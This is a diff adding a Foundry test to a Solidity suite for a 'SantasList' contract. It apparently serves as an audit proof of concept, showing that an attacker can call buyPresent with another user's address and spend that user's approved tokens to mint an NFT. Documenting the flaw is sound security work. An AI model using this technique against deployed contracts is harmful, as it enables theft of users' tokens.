@@ -147,6 +147,38 @@ contract SantasListTest is Test {
         santasList.collectPresent();
     }
 
+    function testBuyPresentWithTokensOfAnotherUser() public {
+        vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
+
+        // The attacker haven't tokens and nfts
+        assertEq(santasList.balanceOf(user), 0);
+        assertEq(santaToken.balanceOf(user), 0);
+
+        // User2 is ExtraNice
+        vm.startPrank(santa);
+        santasList.checkList(user2, SantasList.Status.EXTRA_NICE);
+        santasList.checkTwice(user2, SantasList.Status.EXTRA_NICE);
+        vm.stopPrank();
+
+        // User2 approve token to spend
+        vm.startPrank(user2);
+        santaToken.approve(address(santasList), 1e18);
+        // User2 collect his present and tokens
+        santasList.collectPresent();
+        // Check if users2 have 1 nft and tokens
+        assertEq(santasList.balanceOf(user2), 1);
+        assertEq(santaToken.balanceOf(user2), 1000000000000000000);
+
+        // The attacker buy a nft using user2 tokens
+        vm.startPrank(user);
+        santasList.buyPresent(user2);
+
+        // Now the attacker have 1 nft and the user2 have 0 tokens
+        assertEq(santasList.balanceOf(user), 1);
+        assertEq(santaToken.balanceOf(user2), 0);
+        vm.stopPrank();
+    }
+
     function testBuyPresent() public {
         vm.startPrank(santa);
         santasList.checkList(user, SantasList.Status.EXTRA_NICE);
